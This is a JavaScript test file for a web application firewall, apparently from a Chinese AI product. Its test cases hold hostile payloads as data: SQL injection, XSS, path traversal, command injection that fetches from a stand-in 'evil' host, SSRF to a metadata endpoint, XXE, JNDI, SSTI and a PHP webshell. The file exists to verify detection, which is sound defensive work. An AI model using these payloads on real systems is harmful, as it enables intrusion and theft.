// © 2026 IHUI AI (智汇AI) · 版权所有者: 李春川 (Li Chunchuan) · https://aizhs.top
// Provenance-watermarked. 未授权商用可被溯源追责 (Apache-2.0 须保留本声明与 NOTICE)。
// [IHUI-AI-PROVENANCE]:⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠

/**
 * 入口 WAF 判据用例(2026-11-24 立)。
 * 两条方向都要钉住:
 *   ① 真攻击必须命中(否则这层是装饰);
 *   ② 正常业务(中文搜索、带 select 字样的查询、深路径)绝不能误封 ——
 *      上线即封正常用户比不装更糟。
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  WAF_POLICY,
  BODY_RULES,
  inspectRequest,
  resolveWafMode,
  summarizeHits,
  normalizeScanTarget,
} from '../waf-signatures.mjs'

const req = (url, extra = {}) => inspectRequest({ method: 'GET', url, headers: {}, ...extra })

test('正常业务请求不命中', () => {
  for (const url of [
    '/',
    '/api/chat?q=select%20%E6%9F%A5%E8%AF%A2',
    '/api/articles/2026/11/24/%E4%B8%AD%E6%96%87-%E6%A0%87%E9%A2%98',
    '/api/artifacts/f/9f8e7d6c5b4a39281706f5e4d3c2b1a0',
    '/w/k/h/c/y/p/deep/path',
  ]) {
    assert.equal(req(url).action, 'allow', url)
  }
})

test('SQL 注入组合模式命中', () => {
  const a = req('/api/list?id=1%20union%20select%20username,password%20from%20users')
  assert.equal(a.action, 'block')
  assert.ok(a.hits.some((h) => h.id === 'sqli-union-select'))
  assert.equal(req("/api/x?id=1'%20or%201=1").action, 'block')
  assert.equal(req('/api/x?id=1;sleep(5)').action, 'block')
  assert.equal(req('/api/x?id=1;drop%20table%20users').action, 'block')
})

test('XSS 载荷命中', () => {
  assert.equal(req('/search?q=%3Cscript%3Ealert(1)%3C/script%3E').action, 'block')
  assert.equal(req('/search?q=<img%20onerror=alert(1)>').action, 'block')
  assert.equal(req('/r?to=javascript:alert(1)').action, 'block')
})

test('路径穿越与敏感文件探测命中', () => {
  assert.equal(req('/download?f=../../../../windows/win.ini').action, 'block')
  assert.equal(req('/download?f=..%2f..%2fetc%2fpasswd').action, 'block')
  assert.equal(req('/.env').action, 'block')
  assert.equal(req('/.git/config').action, 'block')
})

test('命令注入与 SSRF/XXE 命中', () => {
  assert.equal(req('/api/proxy?host=127.0.0.1;cat%20/etc/passwd').action, 'block')
  assert.equal(req('/api/fetch?url=http://169.254.169.254/latest/meta-data/').action, 'block')
  assert.equal(req("/api/parse?xml=%3C!DOCTYPE%20x%20[%3C!ENTITY%20e%20SYSTEM%20'file:///etc/passwd'>]%3E").action, 'block')
})

test('扫描器 UA 与恶意方法命中', () => {
  const ua = inspectRequest({ method: 'GET', url: '/', headers: { 'user-agent': 'sqlmap/1.7.2#stable' } })
  assert.equal(ua.action, 'block')
  assert.ok(ua.hits.some((h) => h.id === 'scanner-ua'))
  const trace = inspectRequest({ method: 'TRACE', url: '/' })
  assert.equal(trace.action, 'block')
})

test('中等置信规则只 observe,不拦', () => {
  const r = req('/wp-admin/setup.php')
  assert.equal(r.action, 'observe')
  assert.equal(r.blocking.length, 0)
})

test('超长 URL 按 high 处理', () => {
  const r = req(`/api/x?q=${'a'.repeat(WAF_POLICY.maxUrlLength + 10)}`)
  assert.equal(r.action, 'block')
  assert.ok(r.hits.some((h) => h.id === 'url-too-long'))
})

test('normalizeScanTarget 多轮归一化且截断', () => {
  assert.match(normalizeScanTarget('/a%2e%2e%2fb'), /\.\.\/b/)
  // 套娃编码必须收敛:旧单轮实现下这里只剩 `%27%20union%20select` ⇒ 规则漏判
  assert.match(normalizeScanTarget('/?q=%2527%2520union%2520select%25201'), /union\s+select/)
  assert.equal(normalizeScanTarget(`/${'x'.repeat(9000)}`).length, WAF_POLICY.scanSlice)
  assert.equal(normalizeScanTarget('/bad%zz').includes('%zz'), true)
})

test('resolveWafMode 非法值回落 enforce', () => {
  assert.equal(resolveWafMode('off'), 'off')
  assert.equal(resolveWafMode('observe'), 'observe')
  assert.equal(resolveWafMode('ENFORCE'), 'enforce')
  assert.equal(resolveWafMode(''), 'enforce')
  assert.equal(resolveWafMode('disable'), 'enforce')
})

test('summarizeHits 只输出规则 id,不回写原始载荷', () => {
  const hits = [{ id: 'sqli-union-select', severity: 'critical', desc: 'x' }, { id: 'xxe-doctype', severity: 'high', desc: 'y' }]
  assert.equal(summarizeHits(hits), 'sqli-union-select,xxe-doctype')
})

// ── 体规则(2026-11-25 立:POST/PUT/PATCH 的 body 也要扫) ─────────────────
// 每条「放过」用例都对应一个真实会出现的业务串 —— 误封正常提交比不装更糟。

const post = (body) => inspectRequest({ method: 'POST', url: '/api/x', headers: {}, body })

test('体规则:真载荷必须拦下', () => {
  const mustBlock = {
    'union+from': '{"q":"1 union select 1,2 from users"}',
    'xss': 'name=<script>alert(document.cookie)</script>',
    'traversal': '{"p":"../../../../etc/passwd"}',
    'cmd': '{"c":"; curl http://evil/x.sh"}',
    'jndi': '{"x":"${jndi:ldap://evil/a}"}',
    'ssti': '{"t":"{{ config.items() }}"}',
    'php-deser': 'a=O:8:"stdClass":1:{s:1:"a";i:1;}',
    'webshell': '<?php eval(base64_decode($_POST["x"])); ?>',
    'time-blind': '{"id":"1 or sleep(5)"}',
  }
  for (const [name, payload] of Object.entries(mustBlock)) {
    assert.equal(post(payload).action, 'block', `漏拦: ${name}`)
  }
})

test('体规则:业务串必须放过(这是误伤面的代表)', () => {
  const mustAllow = {
    'union 无 from': '{"q":"union select"}',
    '单层相对路径': '{"note":"../backup"}',
    'script 无执行调用': '{"script":"<script src=\\"/a.js\\"></script>"}',
    'select 与 from 是字段名': '{"select":"department","from":"2026-01-01"}',
    '普通表单': '{"name":"李春川","phone":"13800138000"}',
    '管道后不是命令': '{"s":"a|b"}',
    '超长中文正文': '{"content":"' + '正常文章内容'.repeat(40) + '"}',
  }
  for (const [name, payload] of Object.entries(mustAllow)) {
    assert.equal(post(payload).action, 'allow', `误伤: ${name}`)
  }
})

test('体规则:套娃编码同样收敛(与 URL 共用同一条归一化链)', () => {
  assert.equal(post('%252e%252e%252f%252e%252e%252fetc%252fpasswd').action, 'block')
})

test('体规则:没嗅到体时行为与改造前逐字一致', () => {
  assert.equal(inspectRequest({ method: 'POST', url: '/api/x', headers: {} }).action, 'allow')
  assert.equal(post('').action, 'allow')
  // 老路径(URL 命中)不受影响
  assert.equal(inspectRequest({ method: 'GET', url: '/?q=union select 1 from users', headers: {} }).action, 'block')
})

test('体规则清单形状:全部 target=body 且 id 带 -body 后缀', () => {
  assert.ok(BODY_RULES.length >= 8)
  for (const r of BODY_RULES) {
    assert.equal(r.target, 'body')
    assert.match(r.id, /-body$/)
    assert.ok(r.severity === 'critical' || r.severity === 'high')
  }
})
// ⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
